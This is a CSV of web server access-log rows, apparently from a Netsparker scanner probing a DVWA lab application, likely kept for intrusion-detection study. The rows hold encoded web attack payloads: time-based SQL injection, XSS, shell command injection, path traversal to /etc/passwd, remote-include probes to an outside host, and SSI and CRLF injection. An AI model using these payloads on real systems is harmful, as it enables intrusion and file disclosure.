,host,tool,indent,user,time,method,request_path,status,size,referer,agent
6492,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6493,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6494,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6495,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNTc0KTwvc2NyaXB0Pg%3d%3d&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6496,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNTc1KTwvc2NyaXB0Pg%3d%3d&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6497,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%22%26ping%20-c%2025%20127.0.0.1%20%26%22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6498,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2527 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6499,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%26ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6500,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6501,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%26ping%20-c%2025%20127.0.0.1%20%26%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6502,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2b%20(select%20convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)%20%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6503,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=(select%20convert(int%2ccast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6504,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6505,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6506,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000))) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6507,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6508,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=expr%20268409241%20-%202%20%26&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6509,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6510,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=javascript%3anetsparker(0x000586)&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6511,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=javascript%3anetsparker(0x000587)&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6512,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=NSFTW&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6513,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=print(int)0xFFF9999-22&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6514,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:15 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6515,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/dvwa/?C=N,O=D HTTP/1.1,200,729,"'\""@--></style></scRipt><scRipt>netsparker(0x000585)</scRipt>"
6516,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,"/DVWA/dvwa/includes/?'\""@--></style></scRipt><scRipt>netsparker(0x00058A)</scRipt> HTTP/1.1",200,762,http://192.168.4.161/DVWA/dvwa/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6517,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,"/DVWA/dvwa/includes/?'\""@--></style></scRipt><scRipt>netsparker(0x00058B)</scRipt> HTTP/1.1",200,762,http://192.168.4.161/DVWA/dvwa/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6518,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6519,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%0d%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6520,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%22%7c%7cNETSPARKER%7c%7c&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6521,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6522,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f%2f%2fr87.com%2f%3f&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6523,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6524,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f%5cr87.com%2f%3f&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6525,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6526,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6527,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6528,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6529,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6530,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6531,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%3cscRipt%3ens(0x000589)%3c%2fscRipt%3e&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6532,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=*%2fnetsparker(0x000590)%3b%2f*&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6533,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6534,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6535,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6536,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=body%7bx%3aexpression(netsparker(0x00058E))%7d&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6537,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=body%7bx%3aexpression(netsparker(0x00058F))%7d&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6538,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%0ans%3anetsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6539,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6540,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%22%26expr%20268409241%20-%202%20%26%22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6541,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%22%2bprint(int)0xFFF9999-22%2b%22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6542,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%22%7c%7cNETSPARKER%7c%7c HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6543,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%26expr%20268409241%20-%202%20%26 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6544,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6545,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6546,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20OR%20%27ns%27%3d%27ns HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6547,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6548,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%26expr%20268409241%20-%202%20%26%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6549,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bconvert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6550,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bprint(int)0xFFF9999-22%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6551,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27AND%201%3dcast(0x5f21403264696c656d6d61%20as%20varchar(8000))%20or%20%271%27%3d%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6552,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2bprint(int)0xFFF9999-22%3b%2f%2f HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6553,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6554,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%3c%3f%20print(int)0xFFF9999-22%3b%2f%2f%3f%3e HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6555,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%7bphp%7dprint(int)0xFFF9999-22%3b%7b%2fphp%7d HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
